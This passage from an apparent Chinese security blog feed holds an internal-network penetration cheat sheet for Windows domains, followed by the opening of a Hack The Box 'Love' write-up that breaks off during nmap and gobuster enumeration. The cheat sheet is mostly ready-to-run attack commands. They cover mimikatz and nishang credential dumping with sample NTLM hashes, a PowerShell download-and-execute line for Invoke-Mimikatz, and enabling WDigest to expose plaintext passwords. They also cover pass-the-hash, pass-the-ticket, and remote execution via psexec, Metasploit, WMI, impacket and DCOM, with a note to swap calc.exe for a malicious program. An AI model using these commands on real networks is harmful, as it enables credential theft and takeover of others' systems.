class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp  #导入sekurlsa::logonpasswords full  #获取</span><br></pre></td></tr></table></figure><h3 id="6-powershell对散列值进行dump"><a href="#6-powershell对散列值进行dump" class="headerlink" title="6.powershell对散列值进行dump"></a>6.powershell对散列值进行dump</h3><p><code>nishang脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Get-PassHashes.ps1PS C:\&gt; Get-PassHashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::administration:1000:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br></pre></td></tr></table></figure><h3 id="7-powershell远程加载mimikatz获取密码与散列值"><a href="#7-powershell远程加载mimikatz获取密码与散列值" class="headerlink" title="7.powershell远程加载mimikatz获取密码与散列值"></a>7.powershell远程加载mimikatz获取密码与散列值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure><h3 id="8-单机密码抓取"><a href="#8-单机密码抓取" class="headerlink" title="8.单机密码抓取"></a>8.单机密码抓取</h3><blockquote><p>server 2012以上默认关闭Wdigest功能，server 2012以下版本如果安装了KB2871997也无法获取</p><p>开启Wdigest的两种方法</p></blockquote><p>（1）使用reg add命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f  #开启reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f  #关闭</span><br></pre></td></tr></table></figure><p>（2）powershell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure><h2 id="0x03-哈希传递"><a href="#0x03-哈希传递" class="headerlink" title="0x03.哈希传递"></a>0x03.哈希传递</h2><h3 id="1-使用NTLM-Hash进行哈希传递"><a href="#1-使用NTLM-Hash进行哈希传递" class="headerlink" title="1.使用NTLM Hash进行哈希传递"></a>1.使用NTLM Hash进行哈希传递</h3><blockquote><p>环境</p><p>域名：jiye.net</p><p>IP：10.10.10.10</p><p>用户名：administrator</p><p>NTLM Hash：ae0597dc61a5c66b3a0600c60044c448</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure><p><code>在弹出的system cmd输入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$  #列出域控目标文件夹</span><br></pre></td></tr></table></figure><h3 id="2-使用AES-256密钥进行哈希传递"><a href="#2-使用AES-256密钥进行哈希传递" class="headerlink" title="2.使用AES-256密钥进行哈希传递"></a>2.使用AES-256密钥进行哈希传递</h3><blockquote><p>目标系统安装KB2871997</p></blockquote><h2 id="0x04-票据传递"><a href="#0x04-票据传递" class="headerlink" title="0x04.票据传递"></a>0x04.票据传递</h2><h3 id="1-mimikatz进行票据传递"><a href="#1-mimikatz进行票据传递" class="headerlink" title="1.mimikatz进行票据传递"></a>1.mimikatz进行票据传递</h3><p>（1）导出内存中的票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure><p>（2）清除内存中票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p>（3）将高权限票据注入内存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt c:\mimikatz\tickets\[0;24329]-2-0-40e10000-Administrator@krbtgt-JIYE.NET.kirbi</span><br></pre></td></tr></table></figure><p>（4）列出目标文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure><h3 id="2-kekeo进行票据传递"><a href="#2-kekeo进行票据传递" class="headerlink" title="2.kekeo进行票据传递"></a>2.kekeo进行票据传递</h3><blockquote><p>环境</p><p>域名：jiye.net</p><p>IP：10.10.10.10</p><p>用户名：administrator</p><p>NTLM Hash：ae0597dc61a5c66b3a0600c60044c448</p></blockquote><p>（1）生成票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure><p>（2）清除内存中票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">kekeo#</span><span class="bash"> kerberos::purgeklist purge  <span class="comment">#window自带</span></span></span><br></pre></td></tr></table></figure><p>（3）导入票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\TGT_administrator@JIYE.NET_krbtgt~jiye.net@JIYE.NET.kirbi</span><br></pre></td></tr></table></figure><p>（4）列出目标文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure><h2 id="0x05-psexec的使用"><a href="#0x05-psexec的使用" class="headerlink" title="0x05.psexec的使用"></a>0x05.psexec的使用</h2><h3 id="1-PsTools工具包中的psexec"><a href="#1-PsTools工具包中的psexec" class="headerlink" title="1.PsTools工具包中的psexec"></a>1.PsTools工具包中的psexec</h3><p>（1）获取system shell（需要建立ipc$连接）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe</span><br></pre></td></tr></table></figure><p>（2）获取administrator shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 cmd.exe</span><br></pre></td></tr></table></figure><p>（3）没有建立ipc$连接的使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -u administrator -p 11 cmd.exe</span><br></pre></td></tr></table></figure><p>（4）命令回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="2-msf-中的psexec"><a href="#2-msf-中的psexec" class="headerlink" title="2.msf 中的psexec"></a>2.msf 中的psexec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/psexecmsf6 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.10rhosts =&gt; 10.10.10.10msf6 exploit(windows/smb/psexec) &gt; set smbdomain jiye.netsmbdomain =&gt; jiye.netmsf6 exploit(windows/smb/psexec) &gt; set smbuser administratorsmbuser =&gt; administratormsf6 exploit(windows/smb/psexec) &gt; set smbpass 11smbpass =&gt; 11msf6 exploit(windows/smb/psexec) &gt; set lhost 10.10.10.130lhost =&gt; 10.10.10.130msf6 exploit(windows/smb/psexec) &gt;run</span><br></pre></td></tr></table></figure><h2 id="0x08-WMIC的使用"><a href="#0x08-WMIC的使用" class="headerlink" title="0x08.WMIC的使用"></a>0x08.WMIC的使用</h2><h3 id="1-Windows系统自带"><a href="#1-Windows系统自带" class="headerlink" title="1.Windows系统自带"></a>1.Windows系统自带</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.10 /user:administrator /password:11 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;type \\10.10.10.10\c$\ip.txt</span><br></pre></td></tr></table></figure><h3 id="2-impacket工具包"><a href="#2-impacket工具包" class="headerlink" title="2.impacket工具包"></a>2.impacket工具包</h3><p><code>主要用于Linux向window移动</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-wmiexec-vbs调用wmi"><a href="#3-wmiexec-vbs调用wmi" class="headerlink" title="3.wmiexec.vbs调用wmi"></a>3.wmiexec.vbs调用wmi</h3><p>（1）获取system shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.10 administrator 11</span><br></pre></td></tr></table></figure><p>（2）命令回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd 10.10.10.10 administrator 11 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="4-Invoke-WmiCommand-ps1"><a href="#4-Invoke-WmiCommand-ps1" class="headerlink" title="4.Invoke-WmiCommand.ps1"></a>4.Invoke-WmiCommand.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#目标系统用户名$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #目标系统密码$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #整合$Remote=Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 10.10.10.10  #执行$Remote.PaylaodOutput  #输出</span></span></span><br></pre></td></tr></table></figure><h3 id="5-Invoke-WMIMethod"><a href="#5-Invoke-WMIMethod" class="headerlink" title="5.Invoke-WMIMethod"></a>5.Invoke-WMIMethod</h3><p><code>Powershell自带</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#目标系统用户名$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #目标系统密码$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #整合Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;10.10.10.10&quot;  -Credential $Cred  #运行calc</span></span></span><br></pre></td></tr></table></figure><h2 id="0x09-smbexec"><a href="#0x09-smbexec" class="headerlink" title="0x09.smbexec"></a>0x09.smbexec</h2><h3 id="1-C-版"><a href="#1-C-版" class="headerlink" title="1.C++版"></a>1.C++版</h3><h3 id="2-impacket版"><a href="#2-impacket版" class="headerlink" title="2.impacket版"></a>2.impacket版</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec_impacket.exe jiye/administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-linux安装版"><a href="#3-linux安装版" class="headerlink" title="3.linux安装版"></a>3.linux安装版</h3><h2 id="0x10-DCOM的使用"><a href="#0x10-DCOM的使用" class="headerlink" title="0x10.DCOM的使用"></a>0x10.DCOM的使用</h2><h3 id="1-powershell获取DCOM程序列表"><a href="#1-powershell获取DCOM程序列表" class="headerlink" title="1.powershell获取DCOM程序列表"></a>1.powershell获取DCOM程序列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication  #server 2012版本以上Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication #win 7、server 2008等</span><br></pre></td></tr></table></figure><h3 id="2-DCOM执行系统命令"><a href="#2-DCOM执行系统命令" class="headerlink" title="2.DCOM执行系统命令"></a>2.DCOM执行系统命令</h3><blockquote><p>运行calc.exe，同理将calc.exe换成恶意程序即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="3-DCOM在远程主机上执行命令"><a href="#3-DCOM在远程主机上执行命令" class="headerlink" title="3.DCOM在远程主机上执行命令"></a>3.DCOM在远程主机上执行命令</h3><blockquote><p>环境</p><p>域控：DC（jiye.net）</p><p>IP：10.10.10.10</p><p>user：administrator</p><p>pass：11</p><p>成员服务器：WIN7</p><p>IP：10.10.10.20</p><p>user：DC1</p><p>pass：11</p></blockquote><p>（1）首先建立ipc$连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.10 &quot;11&quot; /user:jiye\administrator</span><br></pre></td></tr></table></figure><p>（2）调用MMC20.Application执行远程命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;10.10.10.20&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>（3）调用{9BA05972-F6A8-11CF-A442-00A0C90A8F39} </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[<span class="built_in">type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;10.10.10.20&quot;</span>)<span class="variable">$obj</span>=[System.Activator]::CreateInstance(<span class="variable">$com</span>)<span class="variable">$item</span>=<span class="variable">$obj</span>.item()<span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Windows常用远程连接&quot;&gt;&lt;a href=&quot;#0x01-Windows常用远程连接&quot; class=&quot;headerlink&quot; title=&quot;0x01.Windows常用远程连接&quot;&gt;&lt;/a&gt;0x01.Windows常用远程连接&lt;/h2&gt;&lt;h3 id=&quot;1-IPC&quot;&gt;&lt;a href=&quot;#1-IPC&quot; class=&quot;headerlink&quot; title=&quot;1.IPC&quot;&gt;&lt;/a&gt;1.IPC&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;利用条件，开启139、445端口，没有关闭默认共享&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;C:\Users\Administrator&amp;gt;net use \\10.10.10.20\ipc$ &amp;quot;11&amp;quot; /user:administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;命令成功完成。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C:\Users\Administrator&amp;gt;net use&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;会记录新的网络连接。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;状态       本地        远程                      网络&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OK                     \\10.10.10.20\ipc$        Microsoft Windows Network&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;命令成功完成。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-love</title>
    <link href="https://lunamoore.github.io/2021/08/05/HTB-love/"/>
    <id>https://lunamoore.github.io/2021/08/05/HTB-love/</id>
    <published>2021-08-05T09:13:34.000Z</published>
    <updated>2021-08-05T09:28:11.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/08/05/HTB-love/image-20210805133747044.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><blockquote><p>信息如下，可以看到http端口有80、5000，在443端口下可以看到staging.love.htb，添加一条hosts</p><p>10.10.10.239    staging.love.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/love]</span><br><span class="line">└─# nmap -sC -sV -sT 10.10.10.239 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 01:31 EDT</span><br><span class="line">Nmap scan report for staging.love.htb (10.10.10.239)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: Secure file scanner</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in</span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, Help, LDAPSearchReq, NULL:</span><br><span class="line">|_    Host &#x27;10.10.17.216&#x27; is not allowed to connect to this MariaDB server</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=8/5%Time=610B77EA%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,4B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allow</span><br><span class="line">SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,4</span><br><span class="line">SF:B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\</span><br><span class="line">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(Help,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(LDAPSearchReq,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h45m34s, deviation: 4h02m32s, median: 25m32s</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_10::-</span><br><span class="line">|   Computer name: Love</span><br><span class="line">|   NetBIOS computer name: LOVE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-08-04T22:58:30-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-08-05T05:58:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 143.66 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>就一个登入框</code></p><img src="/2021/08/05/HTB-love/image-20210805134721475.png" class><h2 id="0x03-访问5000端口"><a href="#0x03-访问5000端口" class="headerlink" title="0x03.访问5000端口"></a>0x03.访问5000端口</h2><p><code>发现没有权限</code></p><img src="/2021/08/05/HTB-love/image-20210805134818437.png" class><h2 id="0x04-列一下目录"><a href="#0x04-列一下目录" class="headerlink" title="0x04.列一下目录"></a>0x04.列一下目录</h2><p><code>可以发现admin dist images includes plugins，访问这些目录并没有发现什么敏感信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/love]</span><br><span class="line">└─# gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirb/common.txt -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:07 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 302]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 302]</span><br><span class="line">/.hta                 (Status: 403) [Size: 302]</span><br><span class="line">/ADMIN                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/ADMIN/]</span><br><span class="line">/Admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/Admin/]</span><br><span class="line">/admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/admin/]</span><br><span class="line">/aux                  (Status: 403) [Size: 302]</span><br><span class="line">/cgi-bin/             (Status: 403) [Size: 302]</span><br><span class="line">/com2                 (Status: 403) [Size: 